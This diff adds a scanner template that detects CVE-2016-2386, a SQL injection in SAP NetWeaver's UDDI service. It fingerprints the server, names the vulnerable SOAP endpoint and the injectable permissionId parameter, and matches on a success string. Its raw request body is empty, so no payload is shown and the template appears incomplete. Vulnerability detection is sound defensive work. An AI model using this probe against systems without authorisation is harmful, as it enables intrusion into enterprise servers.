@@ -1,0 +1,43 @@
+[info]
+author = "ave"
+description = "检测 SAP NetWeaver AS JAVA 7.11-7.50 版本中 UDDI 组件的 SQL 注入漏洞。通过向 /UDDISecurityService/UDDISecurityImplBean 发送特制 SOAP 请求，在 permissionId 参数中注入 SQL 语句，根据响应判断漏洞是否存在。参考 nuclei 模板及 vah13/SAP_exploit 公开 PoC。"
+id = "POC-AVE-2016-0198"
+name = "SAP NetWeaver J2EE Engine UDDI SQL注入漏洞 PoC"
+severity = "critical"
+tags = ["ave-2016-0198"]
+vuln_id = [
+    "CVE-2016-2386",
+    "AVE-2016-0198",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["SAP NetWeaver Application Server"]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/UDDISecurityService/UDDISecurityImplBean"
+protocol = "http"
+
+[poc.requests.body]
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "text/xml;charset=UTF-8"
+SOAPAction = ""
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["deletePermissionByIdResponse"]
